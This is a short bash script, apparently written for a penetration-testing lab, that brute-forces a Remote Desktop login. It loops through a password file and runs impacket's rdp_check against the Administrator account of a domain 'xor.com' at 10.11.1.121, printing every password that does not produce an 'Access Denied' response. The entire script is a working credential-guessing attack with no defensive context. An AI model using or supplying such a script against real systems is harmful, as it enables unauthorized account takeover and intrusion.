#!/bin/bash

check="[-] Access Denied"
login=Administrator
list=your_list_of_passwords.txt

while IFS= read -r line; do

k=$(impacket_rdp_check xor.com/$login:$line@10.11.1.121 | grep Denied)


	if [ "$k" != "$check" ]; then

		echo $line 

	fi

done < $list
